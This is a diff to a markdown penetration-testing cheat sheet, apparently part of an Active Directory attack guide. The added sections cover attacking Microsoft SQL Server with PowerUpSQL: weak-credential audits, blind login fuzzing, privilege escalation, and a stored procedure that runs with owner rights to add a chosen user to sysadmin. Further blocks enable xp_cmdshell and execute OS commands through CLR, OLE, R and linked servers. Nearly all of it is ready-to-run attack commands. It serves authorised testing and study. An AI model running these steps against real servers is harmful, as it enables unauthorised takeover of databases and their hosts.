@@ -1100,11 +1100,33 @@ $data = $data -replace 'MSSQLSvc/', ''
 ```
 Get-SQLInstanceScanUDP -Computername <COMPUTER LIST> 
 ```
+ 
+#### Check Local Instance
+```
+Get-SQLInstanceLocal 
+```
+ 
+#### Check for weak passwords or default credentials
+- Might want to check for default applications with backend SQL Server express for default instances/credentials those applications use.
+```
+Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw -Verbose
+```
+ 
+#### Blind SQL Server Login Enumeration
+```
+Get-SQLFuzzServerLogin -Instance <COMPUTERNAME>\<INSTANCENAME>
+Get-SQLFuzzDomainAccount -Instance <COMPUTERNAME>\<INSTANCENAME>
+```
 
-#### Check accessibility to SQL servers
+#### Check accessibility to SQL servers with current credentials
 ```
 Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
+```
+ 
+#### Check accessibility with other user account
+```
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose -Username <USERNAME> -Password <PASSWORD>
 ```
 
 #### Gather information
@@ -1152,6 +1174,11 @@ Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
 ```
 
 ### Exploitation
+#### Try to excalate privileges
+```
+Invoke-SQLEscalatePriv
+```
+ 
 #### Impersonation attack
 #### Check if impersonation is possible
 ```
@@ -1199,12 +1226,45 @@ GO
 -- Quickly check what the service account is via xp_cmdshell
 EXEC master..xp_cmdshell 'whoami'
 ```
+ 
+### Stored procedure
+- Create stored procedure if you are DB_Owner bot not sysadmin and escalate privs!
+- Stored procedures are sometimes configured to execute as owner, you might are able to edit a procedure.
+- DB must be set as trustworthy
 
+#### Create a stored procedure
+```
+USE <DB>
+GO
+CREATE PROCEDURE sp_elevate_me
+WITH EXECUTE AS OWNER
+AS
+EXEC sp_addsrvrolemember '<USER TO MAKE SYSADMIN>','sysadmin'
+GO
+```
+
+#### Execute procedure
+```
+USE <DB>
+EXEC sp_elevate_me
+```
+ 
+#### Verify user is sysadmin
+```
+SELECT is_srvrolemember('sysadmin')
+```
+ 
 ### Command execution
+![image](https://user-images.githubusercontent.com/43987245/151711415-1bbbdc80-6282-4a66-9dd3-b900616dac8b.png)
+
 #### Execute commands
 ```
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
 Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
+ 
+Invoke-SQLOSCLR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
+Invoke-SQLOSOLe -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
+Invoke-SQLOSR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
 ```
 
 #### Execute command through links
@@ -1237,7 +1297,7 @@ List columns
 List the contents of table
 ```
 
-### Commands
+### SQL Queries
 #### Check if current user is sysadmin
 ```
 SELECT IS_SRVROLEMEMBER('sysadmin')
@@ -1251,6 +1311,20 @@ SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
 #### List all sysadmins
 ```
 SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
+```
+ 
+#### Enable and run xp_cmdshell
+```
+-- Enable show options
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+GO
+-- Enable xp_cmdshell
+EXEC sp_configure 'xp_cmdshell',1
+RECONFIGURE
+GO
+-- Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell 'whoami'
 ```
 
 ## Foreign Security Principals
